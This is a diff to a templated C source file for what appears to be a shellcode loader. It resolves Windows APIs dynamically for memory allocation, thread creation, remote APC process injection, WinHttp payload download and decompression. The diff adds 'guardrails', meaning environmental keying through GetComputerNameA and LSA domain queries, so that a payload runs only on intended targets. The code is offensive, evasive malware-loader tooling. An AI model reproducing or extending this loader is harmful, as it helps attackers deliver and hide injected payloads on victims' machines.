@@ -22,9 +22,12 @@ typedef DWORD (WINAPI *pGetFileSize)(HANDLE, LPDWORD);
 typedef BOOL (WINAPI *pReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
 typedef VOID (WINAPI* pRtlZeroMemory)(PVOID, SIZE_T);
 typedef DWORD (WINAPI *pSleepEx)(DWORD, BOOL);
-{% if execution_method == 'remoteapc' %}
+typedef BOOL (WINAPI *pGetComputerNameA)(LPSTR, LPDWORD);
+{% if execution_method == 'remoteapc' or guardrails_needed %}
 typedef int (WINAPI* pLstrlenA)(LPCSTR);
 typedef DWORD (WINAPI* pGetEnvironmentVariableA)(LPCSTR, LPSTR, DWORD);
+{% endif %}
+{% if execution_method == 'remoteapc' %}
 typedef BOOL (WINAPI* pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
 typedef LPVOID (WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
 typedef BOOL (WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, PSIZE_T);
@@ -55,11 +58,17 @@ typedef BOOL (WINAPI *pWinHttpCrackUrl)(LPCWSTR, DWORD, DWORD, LPURL_COMPONENTSW
 typedef BOOL (WINAPI *pWinHttpSetOption)(HINTERNET, DWORD, LPVOID, DWORD);
 typedef BOOL (WINAPI *pWinHttpQueryHeaders)(HINTERNET, DWORD, LPCWSTR, LPVOID, LPDWORD, LPDWORD);
 {% endif %}
+{% if guardrails_needed %}
+typedef NTSTATUS (WINAPI *pLsaOpenPolicy)(PLSA_UNICODE_STRING, PLSA_OBJECT_ATTRIBUTES, ACCESS_MASK, PLSA_HANDLE);
+typedef NTSTATUS (WINAPI *pLsaQueryInformationPolicy)(LSA_HANDLE, POLICY_INFORMATION_CLASS, PVOID*);
+typedef NTSTATUS (WINAPI *pLsaFreeMemory)(PVOID);
+typedef NTSTATUS (WINAPI *pLsaClose)(LSA_HANDLE);
+{% endif %}
 
 // --- 2. Declare global variables to hold the resolved function pointers ---
+pLoadLibraryA pfnLoadLibraryA;
 pVirtualAlloc pfnVirtualAlloc;
 pCreateThread pfnCreateThread;
-pRtlMoveMemory pfnRtlMoveMemory;
 pWaitForSingleObject pfnWaitForSingleObject;
 pCloseHandle pfnCloseHandle;
 pCreateFileMappingW pfnCreateFileMappingW;
@@ -72,15 +81,18 @@ pHeapFree pfnHeapFree;
 pCreateDecompressor pfnCreateDecompressor;
 pDecompress pfnDecompress;
 pCloseDecompressor pfnCloseDecompressor;
-pLoadLibraryA pfnLoadLibraryA;
 pCreateFileA pfnCreateFileA;
 pGetFileSize pfnGetFileSize;
 pReadFile pfnReadFile;
+pRtlMoveMemory pfnRtlMoveMemory;
 pRtlZeroMemory pfnRtlZeroMemory;
 pSleepEx pfnSleepEx;
-{% if execution_method == 'remoteapc' %}
+pGetComputerNameA pfnGetComputerNameA;
+{% if execution_method == 'remoteapc' or guardrails_needed %}
 pLstrlenA pfnLstrlenA;
 pGetEnvironmentVariableA pfnGetEnvironmentVariableA;
+{% endif %}
+{% if execution_method == 'remoteapc' %}
 pCreateProcessA pfnCreateProcessA;
 pVirtualAllocEx pfnVirtualAllocEx;
 pWriteProcessMemory pfnWriteProcessMemory;
@@ -89,7 +101,7 @@ pQueueUserAPC pfnQueueUserAPC;
 pResumeThread pfnResumeThread;
 pGetLastError pfnGetLastError;
 pNtCreateJobObject pfnNtCreateJobObject;
-pNtSetInformationJobObject pfnNtSetInformationJobObject; 
+pNtSetInformationJobObject pfnNtSetInformationJobObject;
 pNtAssignProcessToJobObject pfnNtAssignProcessToJobObject;
 {% endif %}
 {% if data_source == 'embedded' %}
@@ -110,6 +122,12 @@ pWinHttpCloseHandle pfnWinHttpCloseHandle;
 pWinHttpCrackUrl pfnWinHttpCrackUrl;
 pWinHttpSetOption pfnWinHttpSetOption;
 pWinHttpQueryHeaders pfnWinHttpQueryHeaders;
+{% endif %}
+{% if guardrails_needed %}
+pLsaOpenPolicy pfnLsaOpenPolicy;
+pLsaQueryInformationPolicy pfnLsaQueryInformationPolicy;
+pLsaFreeMemory pfnLsaFreeMemory;
+pLsaClose pfnLsaClose;
 {% endif %}
 
 void ResolveAPIs() {
@@ -199,6 +217,18 @@ void ResolveAPIs() {
     }
     {% endif %}
 
+    {% if guardrails_needed %}
+    pfnGetComputerNameA = (pGetComputerNameA)pfnGetProcAddress(hKernel32, "GetComputerNameA");
+    
+    HMODULE hAdvApi32 = pfnGetModuleHandleA("advapi32.dll");
+    if (hAdvApi32 == NULL && pfnLoadLibraryA != NULL) { hAdvApi32 = pfnLoadLibraryA("advapi32.dll"); }
+    if (hAdvApi32 != NULL) {
+        pfnLsaOpenPolicy = (pLsaOpenPolicy)pfnGetProcAddress(hAdvApi32, "LsaOpenPolicy");
+        pfnLsaQueryInformationPolicy = (pLsaQueryInformationPolicy)pfnGetProcAddress(hAdvApi32, "LsaQueryInformationPolicy");
+        pfnLsaFreeMemory = (pLsaFreeMemory)pfnGetProcAddress(hAdvApi32, "LsaFreeMemory");
+        pfnLsaClose = (pLsaClose)pfnGetProcAddress(hAdvApi32, "LsaClose");
+    }
+    {% endif %}
+
     DEBUG_PRINT("ResolveApis: API functions resolved.");
 }
-
